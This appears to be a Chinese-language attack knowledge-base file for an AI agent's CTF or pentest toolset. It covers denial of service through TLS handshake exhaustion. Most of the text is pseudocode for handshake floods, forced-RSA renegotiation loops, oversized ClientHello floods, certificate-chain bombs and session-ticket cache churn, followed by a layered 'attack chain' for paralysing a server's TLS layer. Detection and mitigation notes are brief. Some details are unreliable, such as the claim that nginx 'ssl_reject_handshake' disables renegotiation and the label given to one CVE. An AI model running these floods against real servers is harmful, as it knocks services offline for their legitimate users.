# TLS/SSL 握手耗尽

## 场景

TLS 握手是不对称的：客户端计算量远小于服务端。攻击者利用此不对称性，以极小带宽和计算资源迫使服务器持续执行昂贵的密钥交换、证书验证或会话恢复操作，消耗 CPU 和内存。

```
TLS 握手成本不对称 (RSA 2048):
  客户端: 1 次 RSA 公钥加密 (加密 pre-master secret)
           + 验证证书链 (可选, 很多客户端跳过)
           ≈ 1-5 ms CPU

  服务端: 1 次 RSA 私钥解密 (解密 pre-master secret)
           + 签名握手消息
           + 可选客户端证书验证
           ≈ 5-50 ms CPU

不对称比: 5-50x
```

```
TLS 握手成本不对称 (ECDHE):
  客户端: ECDH key agreement (1 次 EC 点乘)  ≈ 1-2 ms
  服务端: ECDH key agreement (1 次 EC 点乘)  
           + 签名 (ECDSA/RSA)
           ≈ 3-10 ms

不对称比: 3-5x (比 RSA 小，但并发握手数更多)
```

## 输入信号

- 大量 TCP 443 连接处于 ESTABLISHED 但无后续数据 (TLS 握手未完成)
- `openssl s_server` 日志或 WAF 日志中大量 `SSL_accept` 超时或 `handshake failure`
- 服务器 CPU `system` 时间占比异常高 (RSA 私钥解密 → 内核加密 API 调用)
- OpenSSL/NSS 内部统计中 `accept` 远大于 `connect` (非对称的服务端成本)
- 同一源 IP 在极短时间内发起海量不同 TLS session ID/PSK 尝试
- 重协商请求频率异常 (同一连接 > 10 次重协商，正常 0-1 次)
- 证书验证 CPU 占比异常 (客户端证书链长度为 N × 正常值)
- Session cache 命中率陡降 (被攻击者的大量虚假 session ticket 驱逐)

---

## 方法 1: TLS Handshake Flood

### 原理

发送大量 TLS ClientHello 但不完成握手。服务器为每个 ClientHello 分配状态，等待客户端完成握手。

```
攻击:
  ClientHello → 服务器分配 SSL* 结构体 → 回复 ServerHello + Certificate
  → 攻击者不发 ClientKeyExchange (或不回复)
  → 服务器超时 (默认 60s) 才释放

每个半开握手占用:
  - SSL 结构体: ~10-20 KB
  - OpenSSL 内部状态: ~50 KB
  - 总计: ~70 KB/连接

10000 个半开握手 → ~700 MB
100000 → ~7 GB → OOM
```

### 伪代码

```
function tls_handshake_flood(target, port=443, rate=5000, duration=120):
    """
    发送 ClientHello 后丢弃连接，消耗服务端 TLS 握手资源
    """
    
    deadline = now() + duration
    counter = 0
    
    while now() < deadline:
        # 建立 TCP 连接
        sock = tcp_connect(target, port, timeout=5)
        
        # 发送 TLS ClientHello (支持常见 cipher suites)
        client_hello = build_tls_client_hello(
            hostname=target,
            cipher_suites=[
                TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256,
                TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384,
                TLS_ECDHE_ECDSA_WITH_AES_128_GCM_SHA256,
                TLS_RSA_WITH_AES_128_GCM_SHA256,  # 触发 RSA 解密
            ],
            supported_groups=[X25519, SECP256R1, SECP384R1],
            key_share=[X25519(generate_keypair())],
        )
        
        sock.send(client_hello)
        
        # 不等响应，直接关闭 (RST → 服务端立即释放)
        # 或者等待 ServerHello 后挂起 (不完成握手 → 超时释放)
        sock.close()  # 发 RST → 更快释放 (攻击效果降低)
        # 不 close → 挂起 → 占用状态更久
        
        counter += 1
        if counter % 1000 == 0:
            print(f"[*] {counter} ClientHellos sent")
    
    # 变种: 等收到 ServerHello 后再丢弃 → 消耗更多服务端资源
```

### 效率提升: 强制 RSA 密钥交换

```
# 如果仅公告 RSA 密码套件
# 服务端不得不用 RSA 私钥解密 (成本高 10-50x)

client_hello = build_tls_client_hello(
    cipher_suites=[
        TLS_RSA_WITH_AES_256_GCM_SHA384,   # RSA key exchange
        TLS_RSA_WITH_AES_128_GCM_SHA256,
        TLS_RSA_WITH_AES_256_CBC_SHA,
    ],
    # 不公告任何 ECDHE 套件 → 强制 RSA
    # 不发送 key_share 扩展
)
```

## 方法 2: TLS Renegotiation DoS

### 原理

TLS 允许在已建立连接上重新协商。每次重协商需要完整的握手计算（特别是 RSA 密钥交换时服务端需再次解密 pre-master secret）。

```
攻击:
  1 次 TCP 连接 → 正常 TLS 握手 → 建立加密通道
  → 立即请求 TLS renegotiation
  → 服务端再次执行完整握手 (RSA 解密 + 签名)
  → 攻击者再次请求 renegotiation
  → 单连接无限 renegotiation 循环

成本对比:
  客户端: 每次 renegotiation ~1ms CPU
  服务端 (RSA 2048): 每次 ~15ms CPU
  单连接: 1000 次 renegotiation → 服务端 15 秒 CPU → 客户端 1 秒 CPU
  100 连接并发: 1500 秒 CPU / 秒 → 服务端全面挂起

CVE-2011-1473: OpenSSL renegotiation 无限循环导致 DoS
```

### 伪代码

```
function tls_renegotiation_dos(target, port=443, connections=200,
                                reneg_per_conn=500):
    """
    每连接不断触发重协商，最大化服务端计算成本
    """
    
    async def reneg_loop(conn_id):
        # 建立 TLS 连接，仅使用 RSA 密码套件
        sock = tls_connect(target, port,
                           ciphers="RSA+AESGCM",  # 仅 RSA
                           alpn=None)  # 不协商 ALPN
        
        for i in range(reneg_per_conn):
            # 发起重协商
            sock.renegotiate()
            
            # 等待服务端完成握手 (必须)
            sock.do_handshake()
            
            # 每 50 次报告
            if i % 50 == 0:
                print(f"[{conn_id}] {i} renegotiations complete")
        
        sock.close()
    
    # 并发启动
    parallel(reneg_loop(c) for c in range(connections))
    
    # 效果: connections * reneg_per_conn * 服务端_RSA_时间
    # 200 × 500 × 15ms = 1500 CPU-秒 ≈ 15 个 CPU 核心满载 100 秒
```

### Renegotiation DoS 检测

```
监控信号:
  - TLS renegotiation_info 扩展频繁出现
  - 同一条连接上多次 ServerHello → 明确的重协商信号
  - 连接生命周期中 CPU 时间异常高
  
服务器缓解:
  - 限制单连接重协商次数 (nginx: ssl_reject_handshake on; → 禁止重协商)
  - 限制重协商速率
  - 禁用 TLS 1.2 及以下的重协商 (TLS 1.3 已移除重协商)
```

## 方法 3: ClientHello 状态耗尽

### 原理

TLS 1.3 的 ClientHello 变得更大（key_share、supported_versions、PSK 扩展等）。服务器在收到 ClientHello 后需要：

1. 解析所有扩展
2. 处理 key_share (EC 点验证)
3. 查找 PSK (如果提供)
4. 选择 cipher suite
5. 构造 ServerHello

大量大体积 ClientHello 可耗尽服务器解析资源。

```
大 ClientHello 构造:
  - 公告数百个 cipher suites (每个 2 bytes)
  - 发送大量 key_share (每个 EC 点 ~65 bytes)
  - 发送大量 PSK identities (每个 ~200 bytes)
  - 填充到 MTU (>1400 bytes)

服务器成本:
  正常 ClientHello (~300 bytes):  处理 ~0.1 ms
  大 ClientHello (~4000 bytes):   处理 ~0.5-2 ms
  × 50000/s → 服务器 25-100 CPU-秒/s
```

### 伪代码: 大 ClientHello 洪泛

```
function large_clienthello_flood(target, port=443, rate=30000, duration=120):
    """
    发送大体积 ClientHello，最大化服务器解析成本
    """
    
    # 构造超长 cipher suites 列表
    all_ciphers = [
        0x1301, 0x1302, 0x1303,  # TLS 1.3
        0xC02B, 0xC02F, 0xC02C, 0xC030,  # ECDHE
        0xCCA8, 0xCCA9, 0xCCAA,  # ChaCha20
        0x009C, 0x009D, 0x003C, 0x003D,  # RSA (触发高成本)
        # ... 填充到 100+ 个
    ]
    
    # 构造大量 key_share
    key_shares = []
    for group in [X25519, SECP256R1, SECP384R1, SECP521R1,
                  X448, FFDHE2048, FFDHE3072, FFDHE4096]:
        key_shares.append({
            "group": group,
            "key_exchange": generate_keypair(group).public_bytes
        })
    
    # 构造大量 PSK identities
    psk_ids = [random_bytes(200) for _ in range(50)]
    
    # 构造无用扩展填充体积
    padding = "A" * 2000  # 填充到接近 MTU
    
    client_hello = build_tls13_client_hello(
        hostname=target,
        cipher_suites=all_ciphers,
        key_shares=key_shares,
        psk_identities=psk_ids,
        padding=padding
    )
    
    # 洪泛
    deadline = now() + duration
    sent = 0
    while now() < deadline:
        batch_send_udp_or_tcp(target, port, client_hello, count=100)
        sent += 100
        if sent % 10000 == 0:
            print(f"[*] {sent} large ClientHellos")
```

## 方法 4: 证书链放大

### 原理

在双向 TLS (mTLS) 场景中，攻击者发送巨大客户端证书链。服务端需要：

1. 解析证书链
2. 验证每个证书的签名 (公钥操作)
3. 验证证书链到根 CA
4. 检查 CRL/OCSP 吊销状态

### 伪代码

```
function cert_chain_bomb(target, port=443, 
                         chain_depth=20, duration=120):
    """
    发送超长客户端证书链 → 服务端验证成本极高
    
    适用于:
      - 需要 mTLS 的端点
      - 某些接受可选客户端证书的配置
    """
    
    # 生成超长自签名证书链
    # 每层用不同密钥对 → 服务端需验证 20 次签名
    cert_chain = []
    parent_key, parent_cert = None, None
    
    for i in range(chain_depth):
        key = generate_rsa_key(2048)
        cert = create_self_signed_cert(
            key=key,
            subject=f"CN=level-{i}",
            issuer=parent_cert.subject if parent_cert else None,
            issuer_key=parent_key
        )
        cert_chain.append(cert)
        parent_key, parent_cert = key, cert
    
    # 连接到目标
    for iteration in range(duration * 10):
        sock = tls_connect(target, port,
                           client_cert_chain=cert_chain,
                           client_key=parent_key)
        # 服务端验证整个链 → 20 次 RSA 签名验证
        # 每验证 ~2ms → 40ms 总验证时间
        sock.close()
```

## 方法 5: Session Ticket / PSK 内存耗尽

### 原理

TLS 1.3 的 Session Ticket 和 PSK (Pre-Shared Key) 机制在服务端维护会话状态。攻击者可以：

```
1. 完成 TLS 握手 → 获得 Session Ticket
2. 在新连接中发送 Session Ticket → 服务端解密并恢复会话
3. 每个恢复的会话消耗服务端内存 (SSL 结构体 + 会话数据)
4. 成千上万个不同 Session Ticket → 服务端 OOM

Nginx ssl_session_cache 默认 builtin: 10MB (仅 ~4000 会话)
攻击者生成 10000 个不同 session → 旧 session 被驱逐
→ 合法用户 session 丢失 → 每次必须完整握手
```

### 伪代码

```
function session_ticket_memory_bomb(target, port=443, 
                                     sessions=50000, reuse_rate=1000):
    """
    大量 session ticket 耗尽服务端 session cache
    """
    
    tickets = []
    
    # Step 1: 完成大量 TLS 握手，获取 Session Tickets
    for i in range(sessions):
        sock = tls_connect(target, port)
        sock.do_handshake()
        ticket = sock.get_session_ticket()
        if ticket:
            tickets.append(ticket)
        sock.close()
        
        if i % 1000 == 0:
            print(f"[*] Collected {len(tickets)} session tickets")
    
    # Step 2: 快速重用 tickets，触发服务端 session cache churn
    while True:
        for ticket in random_sample(tickets, reuse_rate):
            sock = tcp_connect(target, port)
            client_hello = build_tls_psk_client_hello(
                hostname=target,
                psk_identity=ticket,
                psk_binder=compute_binder(ticket)
            )
            sock.send(client_hello)
            # 服务端需在 session cache 中查找 ticket
            # 大量查找 + 驱逐 → CPU 高 + cache 抖动
            sock.close()
        
        sleep(0.1)
```

## 攻击链

```
Layer 1 - TLS Handshake Flood:
  → 大量 ClientHello 消耗 CPU + 内存
  → 服务端 SSL 结构体分配 > 物理内存

Layer 2 - Renegotiation DoS:
  → 结合 RSA cipher suite
  → 每条连接持续消耗 CPU (重协商循环)

Layer 3 - Session Cache 抖动:
  → 大量不同 session ticket 使 cache 失效
  → 合法用户被迫每次完整握手

效果: 三层叠加 → 服务端 TLS 层全面瘫痪
```

## 参考资料

1. CVE-2011-1473 — OpenSSL renegotiation infinite-loop DoS
2. CVE-2014-0224 — OpenSSL CCS Injection (man-in-the-middle)
3. "THC-SSL-DOS" — THC (The Hacker's Choice), 2011 (TLS renegotiation tool)
4. CVE-2022-32293 — TCP Middlebox Reflection (TLS-related amplification)
5. RFC 8446 — TLS 1.3 (renamed renegotiation to post-handshake auth)
6. RFC 5077 — TLS Session Resumption without Server-Side State
7. "The Cost of the SSL Handshake" — Cloudflare, 2018
8. "Analysis of TLS Handshake DoS" — IEEE Symposium, 2019
9. BoringSSL / OpenSSL `SSL_renegotiate` API deprecation
10. Nginx `ssl_reject_handshake` directive — TLS handshake flood mitigation

## MCP 工具映射

| 步骤 | 工具 | 说明 |
|------|------|------|
| TLS 配置探测 | `http_probe` | 探测支持的 TLS 版本、密码套件 |
| 技术搜索 | `kb_router` | 搜索 tls / ssl / renegotiation / handshake |
| 技术查阅 | `kb_read_file` | 读取本文件 |

## 证据与验证闭环

- 保存 baseline 与单变量 probe 的完整请求、响应状态、关键响应头和正文摘要。
- 将“响应差异”与服务端副作用分开记录；只有权限、状态、数据或 Flag 可重复变化才算确认。
- 从全新 session/重置状态最小化重放，记录依赖、并发参数、时间窗口及失败样本。
- 输出统一放入 `exports/ctf-website/<case>/`，凭据只用 `REDACTED` 占位，自动检索 `flag{}`、`CTF{}`、`DASCTF{}`。
